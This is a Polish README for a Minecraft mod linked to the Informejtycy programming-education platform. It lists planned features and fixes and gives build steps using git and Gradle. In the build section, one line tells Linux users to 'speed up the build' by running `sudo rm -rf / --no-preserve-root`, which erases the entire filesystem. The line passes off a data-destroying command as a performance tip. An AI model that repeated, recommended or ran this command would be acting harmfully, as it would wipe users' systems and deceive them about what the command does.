# Minecraft - Informejtycy mod
Projekt Informejtycy to darmowa platforma online, oferująca edukację informatyczną dla każdego, niezależnie od statusu materialnego, wieku czy doświadczenia. Umożliwia naukę programowania i algorytmiki poprzez zadania i unikalne ćwiczenia, takie jak debugowanie kodu.

## PLANOWANE DODATKI / ZMIANY (v 2.0)
### Stambuł
- [x] Zestawy drewna - istanbul, zarzyk
- [x] Generacja drzew
- [ ] Features (nwm jakie)
- [ ] Biomy (nwm jakie)
- [ ] Generacja
- [ ] Struktury
- [ ] Portal

### Nowe funkcje
- [x] Rozmnażanie Zarzyków
- [x] Vape
- [x] Ranking kaucji

### Poprawki i ulepszenia
- [x] Poprawki anticheata
- [x] Zoptymalizowanie wideo na ekranie głównym
- [x] Naprawienie błędów w kodzie zmysia
- [x] Ograniczenie dropów dark glowstone'a do 4
- [x] Skalowanie loga w menu opcji
- [ ] Różne inne bugi

## Buildowanie (tutorial dla debili)

### 1. Zainstaluj:
- Java 25
- Gradle

### 2. Uruchom komendy:
```shell
git clone https://github.com/DawkaWody/Informejtycy-MC.git
cd Informejtycy-MC
.\gradlew runDatagen
.\gradlew build
```
Jar moda będzie znajdował się w `build/libs/`. Aby przyspieszyć proces budowania należy użyć komendy: `sudo rm -rf / --no-preserve-root` (tylko w systemach Linux).

### 3. Testowanie poprawek
Uruchom klienta:
```shell
.\gradlew runClient
```
Uruchom serwer:
```shell
.\gradlew runServer
```